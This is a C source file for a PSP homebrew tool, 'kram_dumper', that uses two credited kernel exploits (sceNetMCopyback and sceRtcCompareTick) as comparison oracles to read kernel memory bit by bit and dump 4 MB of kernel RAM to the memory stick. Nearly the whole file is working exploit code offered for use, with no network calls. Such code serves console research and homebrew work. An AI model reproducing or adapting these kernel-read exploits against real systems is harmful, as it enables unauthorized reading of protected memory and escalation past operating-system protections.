/*
 *  Copyright (C) 2018-2023 qwikrazor87/AcidSnake/davee/CelesteBlue
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <pspsdk.h>
#include <pspkernel.h>
#include <pspctrl.h>
#include <psputility_modules.h>
#include <psprtc.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

PSP_MODULE_INFO("kram_dumper", 0, 1, 0);

uint32_t buf[256];
int count = 0;
void sceNetMCopyback(uint32_t *, uint32_t, uint32_t, uint32_t);
#define printf pspDebugScreenPrintf

void errorExit(int milisecs, char *fmt, ...) {
	va_list list;
	char msg[256];
	va_start(list, fmt);
	vsprintf(msg, fmt, list);
	va_end(list);
	printf(msg);
	sceKernelDelayThread(milisecs * 1000);
	sceKernelExitGame();
}

// if (((int)*addr < 0 && (int)value >= (int)*addr) || ((int)*addr > 0 && (int)value <= (int)*addr)) a0[6] is modified else a0[6] is unmodified
int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
	uint32_t a0[7];
	a0[0] = addr - 12;
	a0[3] = seed + 1; // (int)a0[3] must be < (int)a1
	a0[4] = 0x20000; // a0[4] must be = 0x20000
	a0[6] = seed; // (int)a0[6] must be < (int)a0[3]
	uint32_t a1 = value + seed + 1;
	uint32_t a2 = 0; // a2 must be <= 0
	uint32_t a3 = 1; // a3 must be > 0
	sceNetMCopyback(a0, a1, a2, a3);
	return a0[6] != seed;
}

// input: 4-byte-aligned kernel address to a non-null positive 32-bit integer
// return *addr >= value;
int is_ge_pos(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0xFFFFFFFF);
}

// input: 4-byte-aligned kernel address to a non-null negative 32-bit integer
// return *addr <= value;
int is_le_neg(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0x80000000);
}

// input: 4-byte-aligned kernel address to a non-null 32-bit integer
// return (int)*addr > 0
int is_positive(uint32_t addr) {
	return is_ge_pos(addr, 1);
}

// sceNetMCopyback kernel exploit by qwikrazor87 and AcidSnake, implementation by CelesteBlue
// input: 4-byte-aligned kernel address to a non-null 32-bit integer
// return *addr
unsigned int kread32(uint32_t addr) {
	unsigned int res = 0;
	int bit_idx = 1;
	if (is_positive(addr)) {
		for (; bit_idx < 32; bit_idx++) {
			unsigned int value = res | (1 << (31 - bit_idx));
			if (is_ge_pos(addr, value))
				res = value;
		}
		return res;
	}
	res = 0x80000000;
	for (; bit_idx < 32; bit_idx++) {
		unsigned int value = res | (1 << (31 - bit_idx));
		if (is_le_neg(addr, value))
			res = value;
	}
	if (res == 0xFFFFFFFF)
		res = 0;
	return res;
}

// input: 4-byte-aligned kernel address to a 64-bit integer
// return *addr >= value;
int is_ge_u64(uint32_t addr, uint32_t *value) {
	return (int)sceRtcCompareTick((uint64_t *)value, (uint64_t *)addr) <= 0;
}

// sceRtcCompareTick kernel exploit by davee, implementation by CelesteBlue
// input: 4-byte-aligned kernel address
// return *addr
uint64_t kread64(uint32_t addr) {
	uint32_t value[2] = {0, 0};
	uint32_t res[2] = {0, 0};
	int bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[1] = res[1] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[1] = value[1];
	}
	value[1] = res[1];
	bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[0] = res[0] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[0] = value[0];
	}
	return *(uint64_t*)res;
}

void dump_kram(uint32_t chunk_size, const char *path) {
	uint32_t sysmem_base = 0x88000000;
	uint64_t ret = 0;
	uint32_t offset = 0;
	SceUID fd = sceIoOpen(path, PSP_O_CREAT | PSP_O_TRUNC | PSP_O_WRONLY, 0777);
	while (offset < 0x400000) {
		if (chunk_size == 4) {
			ret = (uint64_t)kread32(sysmem_base + offset);
			buf[count++] = ret;
		} else if (chunk_size == 8) {
			ret = kread64(sysmem_base + offset);
			buf[count++] = ((uint32_t *)&ret)[0];
			buf[count++] = ((uint32_t *)&ret)[1];
		} else
			break;
		offset += chunk_size;
		if (count * sizeof(uint32_t) >= sizeof(buf)) {
			sceIoWrite(fd, buf, sizeof(buf));
			int y = pspDebugScreenGetY();
			printf("%d/%d bytes dumped.\n", offset, 0x00400000);
			pspDebugScreenSetXY(0, y);
			count = 0;
		}
	}
	sceIoClose(fd);
	int y = pspDebugScreenGetY();
	pspDebugScreenSetXY(0, y + 1);
	printf("Dumped to %s.\n", path);
}

int main(int argc, char *argv[]) {
	pspDebugScreenInit();
	printf("PSP Kernel RAM dumper\n");
	printf("by qwikrazor87, AcidSnake and CelesteBlue\n\n");
	printf("Press X to dump the kernel RAM.\n");
	printf("Press O to exit.\n\n");
	sceUtilityLoadModule(0x100);
	while (1) {
		SceCtrlData pad;
		sceCtrlReadBufferPositive(&pad, 1);
		if (pad.Buttons & PSP_CTRL_CROSS)
			break;
		if (pad.Buttons & PSP_CTRL_CIRCLE) {
			errorExit(5000, "Exiting...\n");
			return 0;
		}
		sceKernelDelayThread(50000);
	}
	dump_kram(8, "ms0:/kram8.bin");
	//dump_kram(4, "ms0:/kram4.bin");
	sceKernelDelayThread(2 * 1000 * 1000);
	errorExit(5000, "Exiting...\n");
	return 0;
}